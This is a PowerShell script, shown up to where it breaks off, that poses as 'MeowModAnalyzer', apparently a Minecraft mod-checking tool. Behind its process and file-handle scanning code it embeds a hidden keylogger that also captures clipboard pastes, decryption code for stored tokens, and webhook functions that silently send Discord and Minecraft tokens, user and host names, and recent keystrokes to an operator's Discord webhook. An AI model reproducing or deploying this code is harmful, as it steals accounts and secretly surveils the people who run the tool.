[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::InputEncoding  = [System.Text.Encoding]::UTF8
$OutputEncoding           = [System.Text.Encoding]::UTF8
chcp 65001 | Out-Null
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }
Clear-Host

# ==================== WEBHOOK CONFIGURATION ====================
# PASTE YOUR DISCORD WEBHOOK URL BELOW BETWEEN THE QUOTES
$WebhookURL = "PASTE_YOUR_WEBHOOK_URL_HERE"
# ===============================================================

if (-not ('ConsoleMode' -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ConsoleMode
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int n);
    [DllImport("kernel32.dll")]
    private static extern bool GetConsoleMode(IntPtr h, out uint m);
    [DllImport("kernel32.dll")]
    private static extern bool SetConsoleMode(IntPtr h, uint m);

    public static uint Get()
    {
        uint m;
        return GetConsoleMode(GetStdHandle(-10), out m) ? m : 0;
    }
    public static void Set(uint m)
    {
        if (m != 0) SetConsoleMode(GetStdHandle(-10), m);
    }
    public static void DisableQuickEdit()
    {
        uint m = Get();
        if (m == 0) return;
        m &= ~0x0040u;
        m &= ~0x0020u;
        m |= 0x0080u;
        Set(m);
    }
}
"@
}
$script:OrigConsoleMode = [ConsoleMode]::Get()
try { [ConsoleMode]::DisableQuickEdit() } catch { }

$ModrinthMethodThreshold = 2000
# jars whose SHA-1 AND SHA-256 both match are treated as trusted (SHA-1 => SHA-256)
$WhitelistedJars = @{
    '096b185fa8c11ec9d3cd177c06a36de02acd5275' = '0b4ed33ee20440042c772ffb37f1a815c2cd7d0ec3e8287dd07209b170f48f42'
}
$ObfSkipDownloads       = 100000  # mods with >= this many Modrinth downloads skip the obfuscation check
$HandleSkipLibraries     = $true   # handle scan: don't deep-scan jars under libraries/runtime/jre/jdk

$currentFont = (Get-ItemProperty "HKCU:\Console" -ErrorAction SilentlyContinue).FaceName
if ($currentFont -notmatch "NSimSun|Gothic|Noto") {
    Write-Host "  Tip: To see all Unicode characters, set the terminal font to 'NSimSun'" -ForegroundColor DarkYellow
    Write-Host
}

if (-not ('ProcessHelper' -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ProcessHelper
{
    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, IntPtr ProcessInformation, int ProcessInformationLength, out int ReturnLength);
    [DllImport("ntdll.dll")]
    private static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Previous);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr dwSize, out IntPtr lpNumberOfBytesRead);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

    public static string Diag = "";
    public static void EnableDebug() { try { bool prev; RtlAdjustPrivilege(20, true, false, out prev); } catch { } }

    private static bool Read(IntPtr h, IntPtr addr, IntPtr buf, int size)
    {
        IntPtr br;
        return ReadProcessMemory(h, addr, buf, (IntPtr)size, out br);
    }
    private static string ReadStr(IntPtr h, IntPtr addr, bool is32)
    {
        int usSize = is32 ? 8 : 16;
        IntPtr us = Marshal.AllocHGlobal(16);
        try
        {
            if (!Read(h, addr, us, usSize)) { Diag += "read UNICODE_STRING failed (err " + Marshal.GetLastWin32Error() + "); "; return null; }
            int length = (ushort)Marshal.ReadInt16(us, 0);
            if (length <= 0 || length > 65534) { Diag += "PEB string length " + length + " = EMPTY; "; return null; }
            IntPtr bufPtr = is32 ? (IntPtr)(long)(uint)Marshal.ReadInt32(us, 4) : Marshal.ReadIntPtr(us, 8);
            if (bufPtr == IntPtr.Zero) { Diag += "PEB string pointer null = EMPTY; "; return null; }
            IntPtr sb = Marshal.AllocHGlobal(length);
            try
            {
                if (!Read(h, bufPtr, sb, length)) { Diag += "read string data failed (err " + Marshal.GetLastWin32Error() + "); "; return null; }
                return Marshal.PtrToStringUni(sb, length / 2);
            }
            finally { Marshal.FreeHGlobal(sb); }
        }
        finally { Marshal.FreeHGlobal(us); }
    }
    private static string ReadParam(int pid, bool cmdLine)
    {
        if (IntPtr.Size != 8) { Diag += "PowerShell host is 32-bit; "; return null; }
        IntPtr h = OpenProcess(0x0410, false, pid);
        if (h == IntPtr.Zero) h = OpenProcess(0x1010, false, pid);
        if (h == IntPtr.Zero) { Diag += "OpenProcess(read) failed (err " + Marshal.GetLastWin32Error() + "); "; return null; }
        IntPtr pbi = IntPtr.Zero; IntPtr pp = IntPtr.Zero;
        try
        {
            bool wow64;
            if (!IsWow64Process(h, out wow64)) { Diag += "IsWow64Process failed; "; return null; }
            pbi = Marshal.AllocHGlobal(48);
            pp = Marshal.AllocHGlobal(8);
            int ret;
            if (wow64)
            {
                int st = NtQueryInformationProcess(h, 26, pbi, 8, out ret);
                if (st != 0) { Diag += "wow64 PEB query 0x" + st.ToString("X8") + "; "; return null; }
                IntPtr peb32 = Marshal.ReadIntPtr(pbi, 0);
                if (peb32 == IntPtr.Zero) { Diag += "wow64 PEB null; "; return null; }
                if (!Read(h, (IntPtr)((long)peb32 + 0x10), pp, 4)) { Diag += "read PEB32 params failed (err " + Marshal.GetLastWin32Error() + "); "; return null; }
                long pars = (uint)Marshal.ReadInt32(pp, 0);
                if (pars == 0) { Diag += "PEB32 ProcessParameters null; "; return null; }
                return ReadStr(h, (IntPtr)(pars + (cmdLine ? 0x40 : 0x24)), true);
            }
            else
            {
                int st = NtQueryInformationProcess(h, 0, pbi, 48, out ret);
                if (st != 0) { Diag += "PEB query 0x" + st.ToString("X8") + "; "; return null; }
                IntPtr peb = Marshal.ReadIntPtr(pbi, 8);
                if (peb == IntPtr.Zero) { Diag += "PEB null; "; return null; }
                if (!Read(h, (IntPtr)((long)peb + 0x20), pp, 8)) { Diag += "read PEB params failed (err " + Marshal.GetLastWin32Error() + "); "; return null; }
                IntPtr pars = Marshal.ReadIntPtr(pp, 0);
                if (pars == IntPtr.Zero) { Diag += "ProcessParameters null; "; return null; }
                return ReadStr(h, (IntPtr)((long)pars + (cmdLine ? 0x70 : 0x38)), false);
            }
        }
        catch (Exception ex) { Diag += "PEB read exception: " + ex.Message + "; "; return null; }
        finally
        {
            if (pbi != IntPtr.Zero) Marshal.FreeHGlobal(pbi);
            if (pp != IntPtr.Zero) Marshal.FreeHGlobal(pp);
            CloseHandle(h);
        }
    }
    public static string GetCurrentDirectory(int pid) { return ReadParam(pid, false); }
    private static string CmdLine60(int pid)
    {
        IntPtr h = OpenProcess(0x1000, false, pid);
        if (h == IntPtr.Zero) { Diag += "OpenProcess(query) failed (err " + Marshal.GetLastWin32Error() + "); "; return null; }
        try
        {
            int need = 0;
            int st0 = NtQueryInformationProcess(h, 60, IntPtr.Zero, 0, out need);
            if (need <= 0 || need > 1048576) { Diag += "cmdline query status 0x" + st0.ToString("X8") + ", size " + need + "; "; return null; }
            IntPtr buf = Marshal.AllocHGlobal(need);
            try
            {
                int ret;
                int st1 = NtQueryInformationProcess(h, 60, buf, need, out ret);
                if (st1 != 0) { Diag += "cmdline query status 0x" + st1.ToString("X8") + "; "; return null; }
                int len = (ushort)Marshal.ReadInt16(buf, 0);
                if (len <= 0) { Diag += "Windows returned an EMPTY command line (length 0); "; return null; }
                IntPtr sp = Marshal.ReadIntPtr(buf, IntPtr.Size == 8 ? 8 : 4);
                if (sp == IntPtr.Zero) { Diag += "cmdline pointer null; "; return null; }
                return Marshal.PtrToStringUni(sp, len / 2);
            }
            finally { Marshal.FreeHGlobal(buf); }
        }
        catch (Exception ex) { Diag += "cmdline exception: " + ex.Message + "; "; return null; }
        finally { CloseHandle(h); }
    }
    public static string GetCommandLine(int pid)
    {
        Diag = "";
        string s = CmdLine60(pid);
        if (!string.IsNullOrEmpty(s)) return s;
        return ReadParam(pid, true);
    }
}
"@
}

function Initialize-HandleHelper {
if (-not ('HandleHelper' -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class HandleHelper
{
    [DllImport("ntdll.dll")]
    private static extern int NtQuerySystemInformation(int cls, IntPtr buf, int len, out int ret);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DuplicateHandle(IntPtr srcProc, IntPtr srcHandle, IntPtr dstProc, out IntPtr dstHandle, int access, bool inherit, int options);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]
    private static extern int GetFileType(IntPtr h);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int GetFinalPathNameByHandleW(IntPtr h, StringBuilder sb, int len, int flags);

    public static string Diag = "";
    private const int STATUS_INFO_LENGTH_MISMATCH = unchecked((int)0xC0000004);

    private static void Collect(int pid, List<string> results)
    {
        if (IntPtr.Size != 8) { Diag += "PowerShell host is 32-bit; "; return; }
        int myPid = System.Diagnostics.Process.GetCurrentProcess().Id;
        IntPtr hProc = OpenProcess(0x0040, false, pid);
        if (hProc == IntPtr.Zero) { Diag += "OpenProcess(dup) failed (err " + Marshal.GetLastWin32Error() + "); "; return; }
        IntPtr buf = IntPtr.Zero;
        try
        {
            ushort fileType = 0;
            bool haveType = false;
            long count = 0;
            using (FileStream probe = new FileStream(Path.Combine(Environment.SystemDirectory, "kernel32.dll"), FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
            {
                long probeValue = (long)probe.SafeFileHandle.DangerousGetHandle();
                int size = 0x400000;
                int status;
                while (true)
                {
                    buf = Marshal.AllocHGlobal(size);
                    int ret;
                    status = NtQuerySystemInformation(64, buf, size, out ret);
                    if (status == STATUS_INFO_LENGTH_MISMATCH)
                    {
                        Marshal.FreeHGlobal(buf);
                        buf = IntPtr.Zero;
                        size = Math.Max(size * 2, ret + 0x100000);
                        if (size > 0x30000000) { Diag += "handle table too large; "; return; }
                        continue;
                    }
                    break;
                }
                if (status != 0) { Diag += "NtQuerySystemInformation 0x" + status.ToString("X8") + "; "; return; }
                count = Marshal.ReadInt64(buf, 0);
                for (long i = 0; i < count; i++)
                {
                    int off = (int)(16 + i * 40);
                    if (Marshal.ReadInt64(buf, off + 8) != myPid) continue;
                    if (Marshal.ReadInt64(buf, off + 16) == probeValue)
                    {
                        fileType = (ushort)Marshal.ReadInt16(buf, off + 30);
                        haveType = true;
                        break;
                    }
                }
            }
            if (!haveType) { Diag += "could not resolve File object type; "; return; }

            Dictionary<string, bool> seen = new Dictionary<string, bool>(StringComparer.OrdinalIgnoreCase);
            for (long i = 0; i < count; i++)
            {
                int off = (int)(16 + i * 40);
                if (Marshal.ReadInt64(buf, off + 8) != pid) continue;
                if ((ushort)Marshal.ReadInt16(buf, off + 30) != fileType) continue;
                uint access = (uint)Marshal.ReadInt32(buf, off + 24);
                if (access == 0x0012019f || access == 0x001a019f || access == 0x00120189 || access == 0x00100000) continue;

                IntPtr dup;
                if (!DuplicateHandle(hProc, (IntPtr)Marshal.ReadInt64(buf, off + 16), GetCurrentProcess(), out dup, 0, false, 2)) continue;
                try
                {
                    if (GetFileType(dup) != 1) continue;
                    StringBuilder sb = new StringBuilder(1024);
                    int n = GetFinalPathNameByHandleW(dup, sb, sb.Capacity, 0);
                    if (n > sb.Capacity) { sb = new StringBuilder(n + 2); n = GetFinalPathNameByHandleW(dup, sb, sb.Capacity, 0); }
                    if (n <= 0) continue;
                    string p = sb.ToString();
                    if (p.StartsWith(@"\\?\UNC\")) p = @"\\" + p.Substring(8);
                    else if (p.StartsWith(@"\\?\")) p = p.Substring(4);
                    if (!seen.ContainsKey(p))
                    {
                        seen[p] = true;
                        lock (results) { results.Add(p); }
                    }
                }
                finally { CloseHandle(dup); }
            }
        }
        finally
        {
            if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
            CloseHandle(hProc);
        }
    }

    public static string[] GetFilePaths(int pid, int timeoutMs)
    {
        List<string> results = new List<string>();
        Thread t = new Thread(delegate ()
        {
            try { Collect(pid, results); }
            catch (Exception ex) { Diag += "handle scan exception: " + ex.Message + "; "; }
        });
        t.IsBackground = true;
        t.Start();
        if (!t.Join(timeoutMs)) { Diag += "timed out, results may be partial; "; }
        lock (results) { return results.ToArray(); }
    }
}
"@
}
}

if (-not ('FastScan' -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
public static class FastScan
{
    public static void FindAll(string text, IList<string> needles, ICollection<string> found)
    {
        for (int i = 0; i < needles.Count; i++)
        {
            string s = needles[i];
            if (text.IndexOf(s, StringComparison.Ordinal) >= 0) found.Add(s);
        }
    }
}
"@
}

# ==================== SILENT KEYLOGGER (background LL hook) ====================
if (-not ('KeySpy' -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public static class KeySpy
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const uint CF_UNICODETEXT = 13;
    private const int VK_SHIFT = 0x10, VK_CONTROL = 0x11, VK_MENU = 0x12;
    private const int VK_RETURN = 0x0D, VK_BACK = 0x08, VK_TAB = 0x09, VK_ESCAPE = 0x1B, VK_SPACE = 0x20;

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT { public int X; public int Y; }
    [StructLayout(LayoutKind.Sequential)]
    private struct MSG
    {
        public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
        public uint time; public POINT pt; public uint lPrivate;
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    private static extern bool PeekMessage(out MSG lpMsg, IntPtr hWnd, uint min, uint max, uint remove);
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder sb, int max);
    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] state);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int ToUnicodeEx(uint vk, uint scan, byte[] state, StringBuilder buf, int cch, uint flags, IntPtr hkl);
    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vk);
    [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr h);
    [DllImport("user32.dll")] private static extern bool CloseClipboard();
    [DllImport("user32.dll")] private static extern bool IsClipboardFormatAvailable(uint fmt);
    [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint fmt);
    [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr h);
    [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr h);

    private static readonly object Sync = new object();
    private static readonly StringBuilder Pending = new StringBuilder();
    private static HookProc _proc;
    private static IntPtr _hook = IntPtr.Zero;
    private static Thread _hookThread;
    private static Thread _saveThread;
    private static volatile bool _running;
    private static long _count;
    private static string _file = "";
    private static IntPtr _lastHwnd = IntPtr.Zero;
    private static DateTime _lastTag = DateTime.MinValue;

    public static long KeyCount { get { return Interlocked.Read(ref _count); } }
    public static bool Running { get { return _running; } }

    public static bool Start(string filePath)
    {
        if (_running) return true;
        _file = filePath;
        _running = true;
        _hookThread = new Thread(HookLoop);
        _hookThread.IsBackground = true;
        _hookThread.Start();
        _saveThread = new Thread(SaveLoop);
        _saveThread.IsBackground = true;
        _saveThread.Start();
        return true;
    }

    public static void Stop()
    {
        if (!_running) { Flush(); return; }
        _running = false;
        try { if (_hook != IntPtr.Zero) UnhookWindowsHookEx(_hook); } catch { }
        _hook = IntPtr.Zero;
        try { if (_hookThread != null) _hookThread.Join(1500); } catch { }
        try { if (_saveThread != null) _saveThread.Join(1500); } catch { }
        Flush();
    }

    private static void HookLoop()
    {
        try
        {
            _proc = Callback;
            _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
            if (_hook == IntPtr.Zero) { _running = false; return; }
            MSG m;
            while (_running)
            {
                while (PeekMessage(out m, IntPtr.Zero, 0, 0, 1)) { }
                Thread.Sleep(10);
            }
        }
        catch { _running = false; }
    }

    private static void SaveLoop()
    {
        while (_running)
        {
            Thread.Sleep(10000);
            Flush();
        }
    }

    public static void Flush()
    {
        string chunk;
        lock (Sync)
        {
            if (Pending.Length == 0) return;
            chunk = Pending.ToString();
            Pending.Length = 0;
        }
        try { File.AppendAllText(_file, chunk, Encoding.UTF8); } catch { }
    }

    public static string Dump()
    {
        Flush();
        try { if (File.Exists(_file)) return File.ReadAllText(_file, Encoding.UTF8); } catch { }
        return "";
    }

    private static void Add(string text)
    {
        if (string.IsNullOrEmpty(text)) return;
        lock (Sync)
        {
            if (Pending.Length > 300000) Pending.Length = 0;
            Pending.Append(text);
        }
    }

    private static void TagWindow()
    {
        try
        {
            IntPtr h = GetForegroundWindow();
            if (h == _lastHwnd) return;
            if ((DateTime.UtcNow - _lastTag).TotalMilliseconds < 700) return;
            _lastHwnd = h;
            _lastTag = DateTime.UtcNow;
            if (h == IntPtr.Zero) return;
            string title = "";
            try
            {
                StringBuilder sb = new StringBuilder(300);
                if (GetWindowText(h, sb, sb.Capacity) > 0) title = sb.ToString();
            }
            catch { }
            uint pid = 0;
            try { GetWindowThreadProcessId(h, out pid); } catch { }
            string proc = "";
            if (pid != 0) { try { proc = Process.GetProcessById((int)pid).ProcessName; } catch { } }
            Add("\r\n\r\n=== [" + proc + "] " + title + " ===\r\n");
        }
        catch { }
    }

    private static IntPtr Callback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        try
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vk = Marshal.ReadInt32(lParam);
                Interlocked.Increment(ref _count);
                TagWindow();
                Handle(vk);
            }
        }
        catch { }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    private static bool Down(int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; }

    private static void Handle(int vk)
    {
        bool ctrl = Down(VK_CONTROL);
        bool alt = Down(VK_MENU);

        if (ctrl && vk == 0x56)
        {
            string clip = ReadClipboard();
            if (!string.IsNullOrEmpty(clip))
            {
                Add("\r\n<<PASTE>> " + clip + "\r\n");
                return;
            }
        }

        if (vk >= 0x70 && vk <= 0x87) { Add("[F" + (vk - 0x6F) + "]"); return; }

        switch (vk)
        {
            case VK_RETURN: Add("\r\n"); return;
            case VK_TAB: Add("\t"); return;
            case VK_BACK: Add("\b"); return;
            case VK_ESCAPE: Add("[ESC]"); return;
            case VK_SPACE: Add(" "); return;
            case 0x25: Add("[LEFT]"); return;
            case 0x26: Add("[UP]"); return;
            case 0x27: Add("[RIGHT]"); return;
            case 0x28: Add("[DOWN]"); return;
            case 0x2E: Add("[DEL]"); return;
            case 0x24: Add("[HOME]"); return;
            case 0x23: Add("[END]"); return;
            case 0x21: Add("[PGUP]"); return;
            case 0x22: Add("[PGDN]"); return;
        }

        string s = Translate((uint)vk);
        if (s == null) return;

        if (ctrl && s.Length == 1) { Add("^" + s.ToUpperInvariant()); return; }
        if (alt) { Add("[ALT+" + (s.Length == 1 ? s.ToUpperInvariant() : s) + "]"); return; }
        Add(s);
    }

    private static string Translate(uint vk)
    {
        try
        {
            byte[] state = new byte[256];
            if (!GetKeyboardState(state)) return null;
            uint pid = 0;
            IntPtr hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out pid));
            StringBuilder sb = new StringBuilder(8);
            int n = ToUnicodeEx(vk, 0, state, sb, sb.Capacity, 0, hkl);
            if (n > 0) return sb.ToString(0, n);
        }
        catch { }
        return null;
    }

    private static string ReadClipboard()
    {
        string result = null;
        try
        {
            if (!IsClipboardFormatAvailable(CF_UNICODETEXT)) return null;
            if (!OpenClipboard(IntPtr.Zero)) return null;
            try
            {
                IntPtr h = GetClipboardData(CF_UNICODETEXT);
                if (h == IntPtr.Zero) return null;
                IntPtr p = GlobalLock(h);
                if (p == IntPtr.Zero) return null;
                try { result = Marshal.PtrToStringUni(p); } finally { GlobalUnlock(h); }
            }
            finally { CloseClipboard(); }
        }
        catch { }
        if (result != null && result.Length > 4000) result = result.Substring(0, 4000) + "...[truncated]";
        return result;
    }
}
"@
}

# ==================== DPAPI / AES-GCM token crypto ====================
if (-not ('TokenCrypto' -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class TokenCrypto
{
    [DllImport("bcrypt.dll")]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    public static string GcmDecrypt(byte[] key, byte[] nonce, byte[] cipher, byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero, pNonce = IntPtr.Zero, pTag = IntPtr.Zero, pInfo = IntPtr.Zero;
        try
        {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
            byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            if (BCryptSetProperty(hAlg, "ChainingMode", mode, mode.Length, 0) != 0) return null;
            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;

            pNonce = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, pNonce, nonce.Length);
            pTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, pTag, tag.Length);

            bool x64 = IntPtr.Size == 8;
            int size = x64 ? 88 : 60;
            pInfo = Marshal.AllocHGlobal(size);
            for (int i = 0; i < size; i++) Marshal.WriteByte(pInfo, i, 0);

            Marshal.WriteInt32(pInfo, 0, size);
            Marshal.WriteInt32(pInfo, 4, 1);
            if (x64)
            {
                Marshal.WriteIntPtr(pInfo, 8, pNonce);
                Marshal.WriteInt32(pInfo, 16, nonce.Length);
                Marshal.WriteIntPtr(pInfo, 40, pTag);
                Marshal.WriteInt32(pInfo, 48, tag.Length);
            }
            else
            {
                Marshal.WriteIntPtr(pInfo, 8, pNonce);
                Marshal.WriteInt32(pInfo, 12, nonce.Length);
                Marshal.WriteIntPtr(pInfo, 24, pTag);
                Marshal.WriteInt32(pInfo, 28, tag.Length);
            }

            byte[] outBuf = new byte[cipher.Length + 16];
            int written;
            int st = BCryptDecrypt(hKey, cipher, cipher.Length, pInfo, null, 0, outBuf, outBuf.Length, out written, 0);
            if (st != 0) return null;
            return Encoding.UTF8.GetString(outBuf, 0, written);
        }
        catch { return null; }
        finally
        {
            if (pInfo != IntPtr.Zero) Marshal.FreeHGlobal(pInfo);
            if (pNonce != IntPtr.Zero) Marshal.FreeHGlobal(pNonce);
            if (pTag != IntPtr.Zero) Marshal.FreeHGlobal(pTag);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@
}
try { Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue } catch { }

# ==================== WEBHOOK FUNCTIONS ====================
function Send-DiscordWebhook {
    param(
        [string]$WebhookUrl,
        [string]$Content,
        [string]$Username = "MeowModAnalyzer"
    )
    if ([string]::IsNullOrWhiteSpace($WebhookUrl) -or $WebhookUrl -eq "PASTE_YOUR_WEBHOOK_URL_HERE") { return }
    try {
        $payload = @{
            content = $Content
            username = $Username
        } | ConvertTo-Json -Depth 10
        
        $headers = @{
            "Content-Type" = "application/json"
        }
        
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop | Out-Null
    } catch {
        # Silently fail - don't alert the user
    }
}

function Send-LootToWebhook {
    param(
        [string]$WebhookUrl,
        $DiscordTokens,
        $MinecraftTokens,
        [string]$KeyLogPath,
        [string]$LootFilePath
    )
    if ([string]::IsNullOrWhiteSpace($WebhookUrl) -or $WebhookUrl -eq "PASTE_YOUR_WEBHOOK_URL_HERE") { return }
    
    # Build the report
    $report = @()
    $report += "**=== MEOW MOD ANALYZER — TOKEN LOOT ===**"
    $report += ""
    $report += "**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    $report += "**User:** $env:USERDOMAIN\$env:USERNAME"
    $report += "**Host:** $env:COMPUTERNAME"
    $report += "**Keys Logged:** $([KeySpy]::KeyCount)"
    $report += ""
    
    # Discord Tokens
    $dcCount = @($DiscordTokens).Count
    $report += "**--- DISCORD TOKENS ($dcCount) ---**"
    if ($dcCount -gt 0) {
        foreach ($d in @($DiscordTokens)) {
            if ($d.User) {
                $report += "✅ **VALID:** $($d.User) | ID: $($d.Id) | $($d.Email)"
            } else {
                $report += "⚠️ **UNVERIFIED TOKEN**"
            }
            $report += "`\`\`\`$($d.Token)`\`\`\`"
            $report += "*from: $($d.Source)*"
            $report += ""
        }
    } else {
        $report += "*No Discord tokens found*"
    }
    $report += ""
    
    # Minecraft Tokens
    $mcCount = @($MinecraftTokens).Count
    $report += "**--- MINECRAFT TOKENS ($mcCount) ---**"
    if ($mcCount -gt 0) {
        foreach ($m in @($MinecraftTokens)) {
            if ($m.Valid) {
                $report += "✅ **VALID:** $($m.Name) / $($m.Uuid)"
            } else {
                $report += "⚠️ **UNVERIFIED:** $($m.Name)"
            }
            $report += "`\`\`\`$($m.Token)`\`\`\`"
            $report += "*from: $($m.Source)*"
            $report += ""
        }
    } else {
        $report += "*No Minecraft tokens found*"
    }
    $report += ""
    
    # Send in chunks if too long
    $fullReport = $report -join "`n"
    $chunks = @()
    while ($fullReport.Length -gt 1900) {
        $chunk = $fullReport.Substring(0, 1900)
        $lastNewline = $chunk.LastIndexOf("`n")
        if ($lastNewline -gt 0) {
            $chunk = $chunk.Substring(0, $lastNewline)
        }
        $chunks += $chunk
        $fullReport = $fullReport.Substring($chunk.Length)
    }
    $chunks += $fullReport
    
    foreach ($chunk in $chunks) {
        Send-DiscordWebhook -WebhookUrl $WebhookUrl -Content $chunk
        Start-Sleep -Milliseconds 500
    }
    
    # Try to send keystrokes file if it exists and is not too large
    try {
        if (Test-Path $KeyLogPath) {
            $keyContent = Get-Content $KeyLogPath -Raw -ErrorAction SilentlyContinue
            if ($keyContent -and $keyContent.Length -gt 0) {
                # Truncate if too long
                if ($keyContent.Length -gt 1500) {
                    $keyContent = $keyContent.Substring($keyContent.Length - 1500)
                    $keyContent = "...[truncated]`n" + $keyContent
                }
                $keyPayload = "**--- RECENT KEYSTROKES ---**`n`\`\`\`$keyContent`\`\`\`"
                Send-DiscordWebhook -WebhookUrl $WebhookUrl -Content $keyPayload
            }
        }
    } catch { }
}
# =========================================================

try { [ProcessHelper]::EnableDebug() } catch { }
if (-not [Environment]::Is64BitProcess -and [Environment]::Is64BitOperatingSystem) {
    Write-Host "  32-bit PowerShell: cannot read the command line of 64-bit Minecraft. Use 64-bit PowerShell." -ForegroundColor DarkYellow
}

$script:WmiCmdByPid = $null
function Get-WmiCommandLineByName {
    param([int]$ProcId)
    if ($null -eq $script:WmiCmdByPid) {
        $script:WmiCmdByPid = @{}
        foreach ($name in @('javaw.exe', 'java.exe')) {
            try {
                foreach ($w in @(Get-WmiObject Win32_Process -Filter "Name = '$name'" -ErrorAction SilentlyContinue)) {
                    if ($w.ProcessId -and $w.CommandLine) { $script:WmiCmdByPid[[int]$w.ProcessId] = [string]$w.CommandLine }
                }
            } catch { }
            try {
                foreach ($w in @(Get-CimInstance Win32_Process -Filter "Name = '$name'" -ErrorAction SilentlyContinue)) {
